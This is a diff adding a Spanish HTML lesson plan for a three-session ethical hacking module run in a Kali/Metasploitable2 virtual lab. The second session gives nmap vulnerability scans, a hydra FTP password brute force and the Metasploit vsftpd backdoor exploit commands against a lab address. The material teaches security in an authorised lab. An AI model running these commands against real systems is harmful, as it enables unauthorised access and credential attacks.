@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Módulo IV: Seguridad en Redes de Computadoras</title>
+    <style>
+        :root {
+            --primary: #3498db;
+            --secondary: #2980b9;
+            --accent: #e74c3c;
+            --light: #ecf0f1;
+            --dark: #2c3e50;
+            --success: #2ecc71;
+            --warning: #f39c12;
+            --danger: #e74c3c;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: var(--dark);
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f9f9f9;
+        }
+        h1, h2, h3 {
+            color: var(--primary);
+        }
+        h1 {
+            text-align: center;
+            border-bottom: 3px solid var(--primary);
+            padding-bottom: 10px;
+        }
+        .session {
+            background-color: white;
+            border-radius: 10px;
+            padding: 25px;
+            margin: 25px 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .activity {
+            background-color: #e3f2fd;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+        }
+        .terminal {
+            background-color: #2c3e50;
+            color: #ecf0f1;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: 'Courier New', Courier, monospace;
+        }
+        .terminal .prompt {
+            color: var(--success);
+        }
+        .note {
+            background-color: #fff8e1;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            border-left: 4px solid var(--warning);
+        }
+        .warning {
+            background-color: #ffebee;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            border-left: 4px solid var(--danger);
+        }
+        .resource-card {
+            background: white;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            display: flex;
+            align-items: center;
+        }
+        .resource-card img {
+            width: 50px;
+            height: 50px;
+            margin-right: 15px;
+        }
+        .comparison-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        .comparison-table th, .comparison-table td {
+            padding: 12px;
+            border: 1px solid #ddd;
+            text-align: left;
+        }
+        .comparison-table th {
+            background-color: var(--primary);
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <h1>Módulo IV: Seguridad en Redes de Computadoras</h1>
+    <h2>Fundamentos y Prácticas Éticas (3 sesiones de 50 minutos)</h2>
+
+    <div class="warning">
+        <h3>⚠️ Consideraciones Éticas</h3>
+        <p>Todas las prácticas deben realizarse <strong>exclusivamente</strong> en entornos autorizados. El acceso no autorizado a sistemas informáticos es ilegal.</p>
+    </div>
+
+    <div class="session">
+        <h2>Sesión 1: Fundamentos de Seguridad en Redes</h2>
+        <h3>Objetivos:</h3>
+        <ul>
+            <li>Comprender los principios básicos de seguridad en redes</li>
+            <li>Identificar amenazas comunes</li>
+            <li>Configurar un entorno de práctica seguro</li>
+        </ul>
+
+        <div class="activity">
+            <h3>Actividad 1.1: Amenazas Comunes en Redes</h3>
+            <p><strong>Duración:</strong> 20 minutos</p>
+            <p>Analizar los siguientes tipos de ataques:</p>
+            <table class="comparison-table">
+                <tr>
+                    <th>Ataque</th>
+                    <th>Descripción</th>
+                    <th>Ejemplo</th>
+                </tr>
+                <tr>
+                    <td>Man-in-the-Middle</td>
+                    <td>Interceptación de comunicación entre dos partes</td>
+                    <td>ARP spoofing</td>
+                </tr>
+                <tr>
+                    <td>Denegación de Servicio</td>
+                    <td>Sobrecargar un sistema para que no esté disponible</td>
+                    <td>Ping flood</td>
+                </tr>
+                <tr>
+                    <td>Explotación de servicios</td>
+                    <td>Aprovechar vulnerabilidades en servicios de red</td>
+                    <td>Ataque a FTP vulnerable</td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="activity">
+            <h3>Actividad 1.2: Configuración de Entorno de Práctica</h3>
+            <p><strong>Duración:</strong> 30 minutos</p>
+            <div class="terminal">
+                <span class="prompt">#</span> Instalar VirtualBox y descargar imágenes:<br>
+                - Kali Linux<br>
+                - Metasploitable2<br><br>
+                
+                <span class="prompt">#</span> Configurar red en modo "Host-Only"
+            </div>
+        </div>
+    </div>
+
+    <div class="session">
+        <h2>Sesión 2: Técnicas Básicas de Análisis</h2>
+        <h3>Objetivos:</h3>
+        <ul>
+            <li>Aprender técnicas de escaneo de red</li>
+            <li>Identificar servicios vulnerables</li>
+            <li>Realizar pruebas éticas básicas</li>
+        </ul>
+
+        <div class="activity">
+            <h3>Actividad 2.1: Escaneo de Red con Nmap</h3>
+            <p><strong>Duración:</strong> 25 minutos</p>
+            <div class="terminal">
+                <span class="prompt">$</span> sudo nmap -sn 192.168.56.0/24  <span class="comment"># Descubrir hosts</span><br>
+                <span class="prompt">$</span> sudo nmap -sV -sC 192.168.56.101  <span class="comment"># Escanear servicios</span><br>
+                <span class="prompt">$</span> sudo nmap --script vuln 192.168.56.101  <span class="comment"># Buscar vulnerabilidades</span>
+            </div>
+        </div>
+
+        <div class="activity">
+            <h3>Actividad 2.2: Prueba de Vulnerabilidad en FTP</h3>
+            <p><strong>Duración:</strong> 25 minutos</p>
+            <div class="terminal">
+                <span class="prompt">$</span> hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.101<br>
+                <span class="prompt">$</span> msfconsole<br>
+                msf6 > use exploit/unix/ftp/vsftpd_234_backdoor<br>
+                msf6 > set RHOSTS 192.168.56.101<br>
+                msf6 > exploit
+            </div>
+        </div>
+    </div>
+
+    <div class="session">
+        <h2>Sesión 3: Seguridad Práctica y Contramedidas</h2>
+        <h3>Objetivos:</h3>
+        <ul>
+            <li>Aplicar medidas de protección básicas</li>
+            <li>Analizar casos de estudio</li>
+            <li>Evaluar lo aprendido</li>
+        </ul>
+
+        <div class="activity">
+            <h3>Actividad 3.1: Hardening de Servicios</h3>
+            <p><strong>Duración:</strong> 20 minutos</p>
+            <p>Configurar medidas de protección:</p>
+            <div class="terminal">
+                <span class="comment"># En Metasploitable2:</span><br>
+                <span class="prompt">$</span> sudo apt update && sudo apt upgrade  <span class="comment"># Actualizar</span><br>
+                <span class="prompt">$</span> sudo ufw enable  <span class="comment"># Activar firewall</span><br>
+                <span class="prompt">$</span> sudo passwd root  <span class="comment"># Cambiar contraseña</span>
+            </div>
+        </div>
+
+        <div class="activity">
+            <h3>Actividad 3.2: Análisis de Caso Práctico</h3>
+            <p><strong>Duración:</strong> 20 minutos</p>
+            <p>Analizar el ataque WannaCry y su propagación a través de redes:</p>
+            <ul>
+                <li>Vector de ataque: EternalBlue</li>
+                <li>Propagación: SMB vulnerables</li>
+                <li>Contramedidas: Parches MS17-010</li>
+            </ul>
+        </div>
+
+        <div class="activity">
+            <h3>Actividad 3.3: Evaluación Rápida</h3>
+            <p><strong>Duración:</strong> 10 minutos</p>
+            <p>Responder:</p>
+            <ol>
+                <li>¿Qué comando usarías para encontrar hosts activos en una red?</li>
+                <li>Nombra dos medidas para proteger un servidor FTP</li>
+                <li>¿Por qué es importante el principio de mínimo privilegio?</li>
+            </ol>
+        </div>
+    </div>
+
+    <div class="note">
+        <h2>📚 Recursos Adicionales</h2>
+        <p>Profundiza tus conocimientos con nuestras guías detalladas:</p>
+        
+        <div class="resource-card">
+            <img src="https://img.icons8.com/color/48/000000/security-configuration.png" alt="Hacking Ético">
+            <div>
+                <h3><a href="Guia basica hacking etico.html">Guía Básica de Hacking Ético</a></h3>
+                <p>Fundamentos esenciales para principiantes</p>
+            </div>
+        </div>
+        
+        <div class="resource-card">
+            <img src="https://img.icons8.com/color/48/000000/virtual-machine.png" alt="Entornos Virtuales">
+            <div>
+                <h3><a href="Entornos virtuales para pruebas de Hacking etico.html">Entornos Virtuales para Pruebas</a></h3>
+                <p>Configura tu laboratorio de práctica</p>
+            </div>
+        </div>
+        
+        <div class="resource-card">
+            <img src="https://www.pmg-ssi.com/wp-content/uploads/2023/10/ethical-hacking.jpg" alt="Plataformas de Aprendizaje">
+            <div>
+                <h3><a href="Plataformas para aprender hacking etico.html">Plataformas para Aprender</a></h3>
+                <p>Recursos gratuitos para practicar</p>
+            </div>
+        </div>
+        
+        <div class="resource-card">
+            <img src="https://img.icons8.com/color/48/000000/wifi.png" alt="WiFi Security">
+            <div>
+                <h3><a href="Guia etica de analisis de redes wifi.html">Guía Ética de Análisis WiFi</a></h3>
+                <p>Técnicas para evaluar seguridad inalámbrica</p>
+            </div>
+        </div>
+        
+        <div class="resource-card">
+            <img src="https://impulso06.com/wp-content/uploads/2024/04/El-Arte-del-Hacking-Etico-Herramientas-y-Tecnicas-para-la-Defensa-Cibernetica.png" alt="Hacking Ético">
+            <div>
+                <h3><a href="Guia Hacking etico.html">Guía Completa de Hacking Ético</a></h3>
+                <p>Técnicas avanzadas y metodologías</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="warning">
+        <h3>📝 Evaluación Final</h3>
+        <p>Como trabajo práctico, los estudiantes deberán:</p>
+        <ol>
+            <li>Configurar un laboratorio virtual con Kali y Metasploitable2</li>
+            <li>Realizar un escaneo de red básico</li>
+            <li>Identificar y explotar una vulnerabilidad (en su propia red)</li>
+            <li>Documentar medidas de protección aplicables</li>
+        </ol>
+        <p><strong>Fecha de entrega:</strong> 1 semana después de finalizado el módulo</p>
+    </div>
+</body>
+</html>
